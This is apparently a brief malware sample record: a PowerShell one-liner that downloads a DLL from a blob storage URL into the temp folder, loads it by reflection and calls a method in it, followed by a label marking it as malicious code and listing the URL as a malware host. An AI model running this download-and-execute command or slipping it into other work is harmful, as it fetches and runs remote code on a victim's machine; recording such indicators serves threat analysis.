(new-object System.Net.WebClient).DownloadFile('https://devzsstorage.blob.core.windows.net:443/cities/ClassTest.dll',$env:temp + '\ClassTest.dll');[System.Reflection.Assembly]::LoadFile($env:temp+'\ClassTest.dll');[ClassTest.Class1]::Sum();
############################## Malicious code  ##############################
Malware hosting URLs: https://devzsstorage.blob.core.windows.net:443/cities/ClassTest.dll
